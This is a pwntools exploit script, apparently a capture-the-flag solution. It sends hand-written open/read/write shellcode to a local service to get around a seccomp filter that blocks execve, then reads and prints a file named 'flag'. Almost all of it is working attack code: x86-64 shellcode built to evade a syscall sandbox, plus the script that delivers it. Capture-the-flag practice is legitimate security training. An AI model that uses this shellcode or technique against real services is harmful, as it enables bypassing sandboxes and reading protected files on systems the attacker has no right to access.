from pwn import *

context.arch = 'amd64'

# seccomp 拦截了 execve(59) 和 execveat(322)
# 用 open + read + write 绕过, 直接读 flag 文件

shellcode = asm("""
    /* open("flag", O_RDONLY) */
    xor rax, rax
    push rax                        /* null 终止符 */
    mov rax, 0x67616c66            /* "flag" (little endian: "galf") */
    push rax
    mov rdi, rsp                    /* rdi = "flag" */
    xor rsi, rsi                    /* O_RDONLY = 0 */
    xor rdx, rdx
    mov rax, 2                      /* SYS_open */
    syscall

    /* read(fd, rsp, 0x100) */
    mov rdi, rax                    /* fd */
    xor rax, rax                    /* SYS_read = 0 */
    mov rsi, rsp                    /* buf = stack */
    mov rdx, 0x100                  /* size */
    syscall

    /* write(1, rsp, rax) */
    mov rdx, rax                    /* bytes read */
    mov rax, 1                      /* SYS_write */
    mov rdi, 1                      /* stdout */
    mov rsi, rsp                    /* buf */
    syscall

    /* exit(0) */
    mov rax, 60                     /* SYS_exit */
    xor rdi, rdi
    syscall
""")

r = remote("127.0.0.1", 53386)

sleep(0.5)
r.send(shellcode)
log.info(f"Sent {len(shellcode)} bytes ORW shellcode")

flag = r.recvall(timeout=5)
print(flag.decode())

r.close()
